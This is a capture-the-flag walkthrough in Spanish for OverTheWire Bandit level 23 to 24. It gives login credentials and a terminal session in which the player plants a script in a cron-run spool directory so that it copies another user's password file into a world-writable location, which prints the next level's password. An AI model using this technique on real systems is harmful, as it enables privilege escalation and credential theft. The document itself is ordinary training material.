# Level 23 ->  24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso
ssh bandit23@**bandit.labs.overthewire.org** -p2220

user: bandit23
pass: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solucion 
```console
bandit23@bandit:~$ cat /etc/cron
cron.d/       cron.hourly/  crontab       
cron.daily/   cron.monthly/ cron.weekly/  
bandit23@bandit:~$ cat /etc/cron
cron.d/       cron.hourly/  crontab       
cron.daily/   cron.monthly/ cron.weekly/  
bandit23@bandit:~$ cat /etc/cron.
cron.d/       cron.daily/   cron.hourly/  cron.monthly/ cron.weekly/
bandit23@bandit:~$ cat /etc/cron.d
cron.d/     cron.daily/ 
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_banditb_24
cat: /usr/bin/cronjob_banditb_24: No such file or directory
bandit23@bandit:~$ mkdir /tmp/bandscho
bandit23@bandit:~$ cd /tmp/bandscho
bandit23@bandit:/tmp/bandscho$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password"
cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password
bandit23@bandit:/tmp/bandscho$ echo "cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password" > bandscho.sh
bandit23@bandit:/tmp/bandscho$ cat bandscho.sh 
cat /etc/bandit_pass/bandit24 > /tmp/bandscho/password
bandit23@bandit:/tmp/bandscho$ chmod 777 bandscho.sh bandscho.sh 
bandit23@bandit:/tmp/bandscho$ touch password
bandit23@bandit:/tmp/bandscho$ chmod 666 password 
bandit23@bandit:/tmp/bandscho$ ls -la
total 192
drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:34 .
drwxrwx-wt 4821 root     root     184320 Sep  6 13:33 ..
-rwxrwxrwx    1 bandit23 bandit23     55 Sep  6 13:33 bandscho.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Sep  6 13:34 password
bandit23@bandit:/tmp/bandscho$ cp bandscho.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/bandscho$ date
Tue Sep  6 01:36:07 PM UTC 2022
bandit23@bandit:/tmp/bandscho$ date
Tue Sep  6 01:36:33 PM UTC 2022
bandit23@bandit:/tmp/bandscho$ ls -la
total 196
drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:34 .
drwxrwx-wt 4821 root     root     184320 Sep  6 13:35 ..
-rwxrwxrwx    1 bandit23 bandit23     55 Sep  6 13:33 bandscho.sh
-rw-rw-rw-    1 bandit23 bandit23     33 Sep  6 13:37 password
bandit23@bandit:/tmp/bandscho$ cat password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```